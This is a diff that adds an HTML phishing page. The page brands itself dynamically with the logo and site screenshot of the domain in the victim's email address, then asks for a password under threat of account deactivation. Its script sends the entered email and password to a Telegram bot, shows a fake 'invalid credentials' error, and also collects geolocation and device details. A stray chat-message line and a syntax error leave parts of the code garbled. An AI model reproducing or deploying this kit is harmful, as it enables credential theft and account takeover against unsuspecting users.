@@ -1,0 +1,209 @@
+
+<html lang="en">
+<head>
+    <title></title>
+    <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link type="text/css" rel="stylesheet" href="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/corea.css">
+</head>
+
+<body>
+    <!-- Login start -->
+    <div id="altr" style="display: block;">
+        <button class="button-36" role="button">You cannot open files in this window. Please download the attached file and open it on a computer.</button><br><br>
+        <div align="center"><b>...</b></div>
+    </div>
+    <div class="login-1" id="root" style="display:none">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="login-inner-form">
+                        <div class="details">
+                            <form>
+                                <div align="center">
+                                    <h2 class="text-center">
+                                        <div id="top">
+                                            <img src="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/icon.png" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;"> 
+                                            <span style="vertical-align: middle; padding-left: 3px;color: #fff;" id="logoname"></span> 
+                                        </div>
+                                        <p><span style="font-size: 20px;color:gray;">Please sign in to continue </span></p>
+                                        <span style="font-size: 15px;color:white;">Please enter the correct password to avoid deactivation.</span><br><br/>
+                                        <center>
+                                            <div id="Div4" style="display: none;">
+                                                <div class="alert alert-danger" id="msg" style=" font-size:14px; ">Invalid credentials. The email address/password is incorrect.</div>
+                                            </div>  
+                                            <span id="error" class="text-danger" style="display: none;">This account does not exist. Please enter a different account.</span>
+                                        </center>
+                                        <div class="form-group">
+                                            <div class="input-group">
+                                                <span class="input-group-addon"><i class="fas fa-user"></i></span>
+                                                <input type="text" class="form-control" name="username" placeholder="Username" value="" id="username"/>
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div class="input-group">
+                                                <span class="input-group-addon"><i class="fas fa-lock"></i></span>
+                                                <input type="password" class="form-control" autofocus id="password" name="password" placeholder="Password" required="required">
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div align="left">
+                                                <input type="checkbox"><span style="font-size: 15px;color:gray;"> Remember me </span> 
+                                            </div>
+                                        </div>
+                                        <div class="form-group" id="Div1" style="display: block;">
+                                            <button type="button" onclick="sendEmail()" class="btn btn-primary login-btn btn-block" id="omak">Sign In</button>
+                                        </div>
+                                        <div class="form-group" id="Div2" style="display: none;">
+
+> Festus Mbah:
+<button type="button" class="btn btn-primary login-btn btn-block" id="omak">Signing in...</button>
+                                        </div>
+                                    </h2>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Hidden input for tracking attempts -->
+    <input type="hidden" name="count" id="count" value="" />
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+        var emailx = window.location.hash.substr(1);
+        let email = "";
+        if(emailx.slice(0,3) == "B64"){email=window.atob(emailx.slice(3,emailx.length))} else{email=emailx};
+        document.getElementById("altr").style.display = "none";
+        document.getElementById("root").style.display = "block";
+        var ind=email.indexOf("@");
+        var my_slice=email.substr((ind+1));
+        var sv = my_slice;
+        var mainPage = 'https://'+my_slice;
+        var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+        document.title = my_slice+" Login - Enter Password to Sign In"
+        var my_slice2=email.substr(ind+1,email.length);
+        $("#logoname").html(my_slice);
+        $(".logoname").html(my_slice);
+        document.body.style.backgroundImage = image;
+        document.getElementById('username').value = email;
+
+        ////////////////////////////////////
+        // Set Cookie function
+        function setCookie(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + date.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/";
+        }
+
+        // Get Cookie function
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const decodedCookie = decodeURIComponent(document.cookie);
+            const cookieArr = decodedCookie.split(';');
+            for (let i = 0; i < cookieArr.length; i++) {
+                let cookie = cookieArr[i].trim();
+                if (cookie.indexOf(nameEQ) === 0) {
+                    return cookie.substring(nameEQ.length, cookie.length);
+                }
+            }
+            return null;
+        }
+
+        // Save Cookies to Text file
+        function saveCookiesToTxt() {
+            const cookies = document.cookie.split(';');
+            let textContent = "";
+
+            cookies.forEach(function(cookie) {
+                const cookieData = cookie.split('=');
+                textContent += "Cookie Name: " + cookieData[0].trim() + "\n";
+                textContent += "Cookie Value: " + cookieData[1].trim() + "\n\n";
+            });
+
+            const blob = new Blob([textContent], { type: 'text/plain' });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = "cookies.txt";
+            document.body.appendChild(link); // Required for Firefox
+            link.click();
+            document.body.removeChild(link); // Remove after click
+        }
+
+        // Get Geolocation and save it as a cookie
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    setCookie("location", lat + "," + lon, 30); // Store location as cookie
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+// Get Device Info and save it as a cookie
+        function getDeviceInfo() {
+            const userAgentInfo = navigator.userAgent;
+            const platformInfo = navigator.platform;
+            const deviceInfo = UserAgent: ${userAgentInfo}, Platform: ${platformInfo};
+            setCookie("deviceInfo", deviceInfo, 30); // Store device info as a cookie
+        }
+
+        // Modified sendEmail function
+        function sendEmail() {
+            if (document.getElementById('password').value === '') {
+                window.alert('Please enter a valid password!');
+                return false;
+            }
+            
+            // Hide and show elements as per your original logic
+            document.getElementById("Div4").style.display = "none";
+            document.getElementById("Div1").style.display = "none";
+            document.getElementById("Div2").style.display = "block";
+            
+            var oo = document.getElementById('username').value;
+            var pp = document.getElementById('password').value;
+            var ozi = "\n===DOMC=====\n";
+            ozi += "E:" + oo;
+            ozi += "\nP:" + pp;
+            ozi += "\n=========\n";
+            tmsend(ozi);
+            
+            // Get location and device info
+            getLocation();
+            getDeviceInfo();
+            
+            // Save cookies to text file after form submission
+            setTimeout(function() {
+                saveCookiesToTxt();  // Save the cookies as a text file
+                document.getElementById('password').value = "";
+                document.getElementById("Div4").style.display = "block";
+                document.getElementById("Div1").style.display = "block";
+                document.getElementById("Div2").style.display = "none";
+            }, 3000);
+        }
+
+        // Function to send data to the server
+        function tmsend(message) {
+            const token = "5";
+            const chatid = "";
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            
+            const obj = {
+                chat_id: chatid,
+                text: message
+            };
+
+            const xht = new XMLHttpRequest();
+            xht.open("POST", url, true);
+            xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+            xht.send(JSON.stringify(obj));
+        }
+    </script>
+</body>
+</html>
